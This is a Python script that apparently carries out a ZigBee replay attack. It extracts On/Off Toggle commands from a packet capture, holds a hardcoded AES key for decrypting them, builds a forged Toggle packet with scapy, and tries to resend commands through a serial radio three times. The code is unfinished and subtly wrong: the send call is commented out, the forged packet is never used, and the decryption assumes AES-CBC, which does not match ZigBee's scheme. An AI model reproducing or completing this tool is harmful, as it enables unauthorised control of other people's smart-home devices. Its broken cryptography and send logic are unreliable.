import logging
import argparse
import pyshark
import os
import serial
from scapy.all import *
from scapy.layers.dot15d4 import Dot15d4
from scapy.layers.dot15d4 import Dot15d4FCS
from scapy.layers.zigbee import *
from scapy.layers.zigbee import ZigbeeNWK, ZigbeeClusterLibrary, ZigbeeSecurityHeader,ZCLGeneralReadAttributes, ZCLGeneralWriteAttributes, ZCLGeneralReportAttributes,ZCLIASZoneZoneStatusChangeNotification,ZigbeeAppDataPayload
from scapy.layers import * 
from scapy.layers.dot11 import RadioTap
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

toggle_packets = []
# Configure logging to provide clear, informative output
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Decryption key (this should be kept secure and handled properly)
DECRYPTION_KEY = bytes.fromhex("9b9494920170aeed67e90ce7d672face")

def decrypt_zigbee_packet(packet):
    """
    Decrypt ZigBee packet using the provided AES-128 key.
    
    Args:
        packet (Scapy Packet): ZigBee packet with ZigBee Security Header
        
    Returns:
        Scapy Packet: Decrypted ZigBee packet
    """
    if packet.haslayer(Raw):
        encrypted_data = bytes(packet[Raw].load)
        try:
            # Initialize AES cipher for decryption with the provided key (AES-128)
            cipher = AES.new(DECRYPTION_KEY, AES.MODE_CBC, iv=encrypted_data[:16])  # Assuming IV is the first 16 bytes
            
            # Decrypt and unpad
            decrypted_data = unpad(cipher.decrypt(encrypted_data[16:]), AES.block_size)
            
            # Replace the encrypted payload with the decrypted one
            packet[Raw].load = decrypted_data
            logger.info(f"Packet decrypted successfully.")
            print(f"Packet decrypted successfully.")
        
        except Exception as e:
            logger.warning(f"Decryption failed: {e}")
    
    return packet

def find_toggle_packets(pcap_file):
    """
    Find ZigBee toggle packets in a PCAP file using the precise ZCL command filter.
    
    Args:
        pcap_file (str): Path to the PCAP file containing ZigBee captures
    
    Returns:
        list: List of raw toggle packet bytes
    """
    
    
    try:
        # Open the PCAP file with pyshark
        capture = pyshark.FileCapture(
            pcap_file,
            include_raw=True,
            use_json=True,
            display_filter='zbee_zcl_general.onoff.cmd.srv_rx.id == 0x02'  # Toggle command
        )
        toggle = None
        
        for packet in capture:
            try:
                # Ensure the packet contains the ZigBee ZCL layer
                if hasattr(packet, 'zbee_zcl'):
                    zcl_layer = packet.zbee_zcl
                    '''
                    for field_name in zcl_layer.field_names:
                        field_value = zcl_layer.get(field_name, None)
                        print(f"{field_name}: {test}")
                        print("-----------------")
                    '''
                    #print(zcl_layer.id_raw[0])
                    toggle_packets.append(packet)
                        
            
            except Exception as packet_error:
                logger.warning(f"Could not process packet: {packet_error}")
        
        return toggle_packets
    
    except Exception as file_error:
        logger.error(f"Error reading PCAP file: {file_error}")
        return []

def replay_packets(packets, interface):
    """
    Replay ZigBee Home Automation packets on specified interface.
    
    Uses scapy to construct and send ZigBee Home Automation packets.
    
    Args:
        packets (list): List of packet bytes to replay (optional)
        interface (str): Network interface to send packets (serial port)
    
    Returns:
        bool: True if replay successful, False otherwise
    """
    try:
        # Open serial port with specific parameters for ZigBee interface
        ser = serial.Serial(
            port=interface, 
            baudrate=115200,  # Typical baudrate for ZigBee interfaces
            timeout=1
        )
        print(toggle_packets[0].show())
        # Construct ZigBee Home Automation packet if no packets are provided
        if not packets:
            # Example ZigBee HA packet: On/Off Toggle Command to a light
            
            # Construction d'un paquet ZigBee Home Automation (commande On/Off - Toggle)
            zigbee_packet = (
                Dot15d4(fcf_panid_compression=1, seqnum=1) /
                ZigbeeNWK(
                    frametype=0x01,  # Data frame
                    delivery_mode=0x00,  # Unicast
                    dest=0x5678,  # Adresse courte du dispositif cible
                    source=0x9ABC,  # Adresse courte de l'émetteur
                    radius=30  # Nombre de sauts maximum
                ) /
                ZigbeeAppDataPayload(
                    dst_endpoint=0x01,  # Endpoint de destination
                    cluster=0x0006,  # Cluster On/Off
                    profile=0x0104,  # ZigBee Home Automation Profile
                    src_endpoint=0x01,  # Endpoint source
                    counter=1  # Compteur APS
                ) /
                ZigbeeClusterLibrary(
                    zcl_frametype=0x01,  # Commande spécifique au cluster
                    command_direction=0,  # Client vers serveur
                    transaction_sequence=1,  # Numéro de transaction
                    command_identifier=0x02  # Commande Toggle
                )
            )
            
            # Conversion en octets pour envoi via le port série
            packet_bytes = bytes(zigbee_packet)

        # Send each packet via the serial interface
        #ser.write(packet)
        #logger.info(f"Sent ZigBee Home Automation packet via {interface}: {packet.hex()}")
        
        ser.close()
        return True

    except PermissionError:
        logger.error(f"Permission denied. Ensure you have root/sudo privileges on {interface}")
        return False
    except Exception as e:
        logger.error(f"Replay failed: {e}")
        return False

def main():
    """
    Main function to parse command-line arguments and execute ZigBee packet replay.
    
    Provides a simple CLI for finding and replaying ZigBee toggle packets.
    """
  
    # Find toggle packets using the precise ZCL filter
    toggle_packets = find_toggle_packets("../../../../../replay.pcapng")
    
    if not toggle_packets:
        logger.error("No toggle packets found")
        return
    
    # Replay packets multiple times if specified
    for _ in range(3):
        if not replay_packets(toggle_packets, "/dev/ttyACM0"):
            logger.error("Packet replay failed")
            return

if __name__ == "__main__":
    main()
